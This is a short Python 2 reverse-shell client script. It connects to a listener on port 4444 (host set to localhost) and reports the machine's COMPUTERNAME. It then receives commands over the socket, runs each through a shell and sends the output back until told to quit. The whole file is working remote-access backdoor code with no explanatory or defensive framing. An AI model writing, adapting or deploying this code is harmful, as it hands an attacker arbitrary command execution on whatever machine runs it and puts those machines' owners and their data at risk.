#!/usr/bin/env python
#-*- coding: utf-8 -*-

import socket, subprocess, os

def connect():
    os.system('cls')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 4444
    host = 'localhost'
    try:
        print "[!] Trying to connect to {} {} ...".format(host, port)
        s.connect((host, port))
        print "[*] Connected established"
        s.send(os.environ['COMPUTERNAME'])
    except:
        print "Could not connect :("

def receive():
    receive = s.recv(1024)
    if receive == "quit":
        s.close()
    else:
        proc2 = subprocess.Popen(receive, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_value
    send(args)

def send(args):
    send = s.send(args)
    receive()

def main():
    connect()
    receive()
    s.close()

main()
